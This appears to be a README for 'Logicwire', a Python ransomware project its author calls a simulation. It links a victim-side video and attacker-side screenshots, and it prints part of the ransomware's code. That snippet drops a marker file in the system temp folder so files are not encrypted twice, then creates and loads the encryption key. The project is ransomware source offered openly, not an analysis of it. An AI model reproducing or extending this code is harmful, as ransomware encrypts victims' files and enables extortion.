<img src="https://media.discordapp.net/attachments/768928242467340328/811300430985560124/fond-geometrique-3d-noir-low-low-noir_79145-393.jpg"><br><br><img src="https://forthebadge.com/images/badges/built-with-love.svg" height="40" length="40"> <img src="https://forthebadge.com/images/badges/made-with-python.svg" height="40" length="40"> <img src="https://forthebadge.com/images/badges/fuck-it-ship-it.svg" height="40" length="40">
# Logicwire
Logicwire is a disguised version of ransomwares. It allows to simulate an attack, without being very dangerous.
# Victim POV
I put as unique folder the pit named "fichiers" because I did not have a windows vm.<br>
https://www.youtube.com/watch?v=y02J6HjoihA&feature=youtu.be&ab_channel=%26
# Attacker POV
<img src="https://media.discordapp.net/attachments/768928242467340328/811308563690684486/unknown.png?width=1154&height=670"><br>
<img src="https://media.discordapp.net/attachments/768928242467340328/811308892696739840/unknown.png?width=1443&height=386">
# Technical operation
It installs a .tmp signature in the Temp cache to avoid double encryption of files. And check if it is there, if he is present he only run the ransomware GUI.
```python3
tmp = str(tempfile.gettempdir())
signature = "cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp"
path = os.path.dirname(os.path.abspath(signature))
tmp_files = []
for root, dirs, files in os.walk(tmp):
        for file in files:
            tmp_files.append(file)

if signature in tmp_files:
        main()
else:
        file = open("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5.tmp", "w").write("cea4b847-c3af-48c9-8260-fsf45zd5f2qzd5")
        shutil.move(path + "\\" + signature, tmp + "\\" + signature)
        write_key()
        key = load_key()
```
